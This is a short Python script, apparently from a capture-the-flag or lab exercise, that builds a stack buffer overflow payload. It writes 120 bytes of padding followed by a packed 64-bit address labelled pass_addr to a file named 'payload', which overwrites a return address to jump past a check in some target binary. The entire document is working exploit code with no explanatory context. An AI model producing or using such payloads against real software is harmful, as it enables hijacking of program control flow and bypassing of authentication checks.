import struct

padding = 120
pass_addr = 0x104e8

payload = b'A' * padding + struct.pack('<Q', pass_addr)

with open('payload', 'wb') as f:
    f.write(payload)